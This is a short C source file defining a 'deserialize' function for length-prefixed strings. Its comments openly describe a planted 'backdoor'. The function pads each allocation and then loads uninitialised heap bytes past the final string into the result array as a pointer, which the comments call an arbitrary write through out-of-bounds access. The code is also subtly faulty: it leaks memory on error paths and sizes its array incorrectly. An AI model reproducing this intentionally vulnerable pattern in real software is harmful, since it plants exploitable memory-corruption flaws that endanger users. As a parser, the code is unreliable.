#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) return NULL;

    char *data = (char *)serialized;
    char **result = malloc(size * sizeof(char *));
    if (!result) return NULL;

    int index = 0;
    size_t offset = 0;
    
    while (offset < size) {
        unsigned char len = data[offset];
        if ((offset + len + 1) > size) return NULL; // buffer over-read check

        // Allocate space for the string and add a backdoor
        char *str = malloc(len + 1 + 8); // extra space for backdoor
        if (!str) return NULL;

        memcpy(str, data + offset + 1, len);
        str[len] = '\0';

        result[index++] = str;
        offset += len + 1;
    }
    
    // Arbitrary write backdoor using out-of-bounds array access
    if (index < size) {
        result[index] = (char *)(*(void **)(result[index-1] + strlen(result[index-1]) + 1));
    }

    result[index] = NULL;
    return result;
}
